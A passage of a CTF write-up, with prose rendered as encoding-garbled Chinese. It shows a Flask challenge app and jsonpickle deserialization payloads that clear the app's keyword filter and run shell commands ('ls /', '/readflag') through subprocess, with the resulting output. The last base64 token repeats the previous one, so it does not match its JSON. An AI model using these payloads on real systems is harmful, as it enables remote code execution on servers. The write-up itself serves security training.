<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">&#39;/auth&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    u <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;u&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    p <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;p&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">for</span> acc <span class="token keyword">in</span> users_db<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">if</span> acc<span class="token punctuation">.</span>uid <span class="token operator">==</span> u <span class="token keyword">and</span> acc<span class="token punctuation">.</span>pwd <span class="token operator">==</span> p<span class="token punctuation">:</span></span>
<span class="line">            sess_data <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> u<span class="token punctuation">,</span> <span class="token string">&#39;ts&#39;</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></span>
<span class="line">            token_raw <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>sess_data<span class="token punctuation">)</span></span>
<span class="line">            b64_token <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>token_raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">&quot;ç™»å½•æˆåŠŸã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">&quot;authz&quot;</span><span class="token punctuation">,</span> b64_token<span class="token punctuation">)</span></span>
<span class="line">            resp<span class="token punctuation">.</span>status_code <span class="token operator">=</span> <span class="token number">302</span></span>
<span class="line">            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;Location&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&#39;/panel&#39;</span></span>
<span class="line">            <span class="token keyword">return</span> resp</span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;index.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç™»å½•å¤±è´¥ã€‚ç”¨æˆ·åæˆ–å¯†ç æ— æ•ˆã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/panel&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">panel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;authz&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç¼ºå°‘Tokenã€‚&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">except</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;Tokenæ ¼å¼é”™è¯¯ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    ban <span class="token operator">=</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;è¯·ä¸è¦é»‘å®¢æ”»å‡»ï¼</span><span class="token interpolation"><span class="token punctuation">{</span>ban<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        sess_obj <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>decoded<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></span>
<span class="line">        meta <span class="token operator">=</span> sess_obj<span class="token punctuation">.</span>meta</span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;user_panel.html&#39;</span><span class="token punctuation">,</span> username<span class="token operator">=</span>meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;user&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;admin_panel.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;æ•°æ®è§£ç å¤±è´¥ã€‚&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/vault&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">vault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;authz&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;è¯·ä¸è¦å°è¯•é»‘å®¢æ”»å‡»ï¼&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        sess_obj <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>decoded<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></span>
<span class="line">        meta <span class="token operator">=</span> sess_obj<span class="token punctuation">.</span>meta</span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;è®¿é—®è¢«æ‹’ç»ã€‚åªæœ‰ç®¡ç†å‘˜æ‰èƒ½æŸ¥çœ‹æ­¤é¡µé¢ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        flag <span class="token operator">=</span> <span class="token string">&quot;NepCTF{fake_flag_this_is_not_the_real_one}&quot;</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;vault.html&#39;</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>flag<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">except</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/about&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;about.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span></span>
<span class="line">    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">&#39;0.0.0.0&#39;</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æˆ‘ä»¬å¯ä»¥è°ƒç”¨åˆ¶å®šæ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨<code>__main__.FORBIDDEN.clear()</code>ç›´æ¥æŠŠå±è”½è¯æ‰¬äº†</p><blockquote><p>Provided by Pid</p></blockquote><p>â€‹ Payloadå¦‚ä¸‹ï¼š</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.FORBIDDEN.clear&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;py/newargs&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753451910</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogeyJweS9vYmplY3QiOiAiX19tYWluX18uRk9SQklEREVOLmNsZWFyIiwgInB5L25ld2FyZ3MiOiBbXX0sICJ0cyI6IDE3NTM0NTE5MTB9fQ==</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æ‰§è¡Œä¹‹åå±è”½è¯å°±æ²¡äº†ğŸ˜‹</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;subprocess.getoutput&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;py/newargs&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;ls /&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753451910</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogeyJweS9vYmplY3QiOiAic3VicHJvY2Vzcy5nZXRvdXRwdXQiLCAicHkvbmV3YXJncyI6IFsibHMgLyJdfSwgInRzIjogMTc1MzQ1MTkxMH19</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line">ç”¨æˆ·å:</span>
<span class="line">app bin boot dev entrypoint.sh etc flag home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æ‰§è¡Œ<code>/readflag</code>å³å¯è·å¾—flag</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;subprocess.getoutput&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;py/newargs&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;/readflag&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753451910</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogeyJweS9vYmplY3QiOiAic3VicHJvY2Vzcy5nZXRvdXRwdXQiLCAicHkvbmV3YXJncyI6IFsibHMgLyJdfSwgInRzIjogMTc1MzQ1MTkxMH19</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line">ç”¨æˆ·å:</span>
<span class="line">NepCTF<span class="token punctuation">{</span>d08fb277-1a51-fd9d-39aa-98cad01a05d7<span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></div><!--[--><!--]--></div><footer class="vp-page-meta"><!----><div class="vp-meta-item git-info"><div class="vp-meta-item last-updated"><span class="meta-item-label">Last Updated:: </span><time class="meta-item-info" datetime="2026-01-12T09:23:14.000Z" data-allow-mismatch>1/12/26, 9:23 AM</time></div><div class="vp-meta-item contributors"><span class="meta-item-label">Contributors: </span><span class="meta-item-info"><!--[--><!--[--><span class="contributor" title="email: bxgh6_xivkv71ra8@163.com">songsanggggg</span><!----><!--]--><!--]--></span></div></div></footer><!----><!--[--><!--]--></main><!--]--></div><!--[--><!----><!--]--><!--]--></div>
    <script type="module" src="/assets/app-C2I5gSR0.js" defer></script>
  </body>
</html>
